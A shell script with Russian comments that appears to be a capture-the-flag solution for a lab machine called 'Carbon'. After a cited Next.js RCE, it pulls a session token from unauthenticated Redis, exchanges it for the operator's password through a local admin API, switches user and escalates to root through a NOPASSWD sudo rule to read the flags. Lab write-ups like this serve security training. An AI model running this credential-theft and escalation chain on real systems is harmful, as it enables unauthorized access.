#!/bin/sh
# Carbon: шаги после RCE на nextjs (внутри контейнера).
# RCE получен через уязвимость Next.js 15.5.6 (CVE-2025-55182, React2Shell);
# точный PoC-запрос в логах не сохранился, ниже - то, что подтверждено.

# 1. Готовый рецепт лежит в заметках оператора
cat /opt/carbon/ops-notes.md

# 2. Токен оператора берём из Redis (без авторизации, только localhost)
redis-cli --raw GET session:operator

# 3. Меняем токен на пароль оператора
P=$(curl -s -m 8 -H "Authorization: Bearer $(redis-cli --raw GET session:operator)" \
    http://127.0.0.1:9000/admin/operator-credential)

# 4. Переключаемся на оператора (TTY требует паузы перед вводом пароля)
script -qec "su operator" /dev/null
#   cat /home/operator/user.txt      -> user-флаг

# 5. Root: у оператора sudo NOPASSWD на служебный скрипт
sudo /usr/local/bin/<service-script>
#   cat /root/root.txt               -> root-флаг
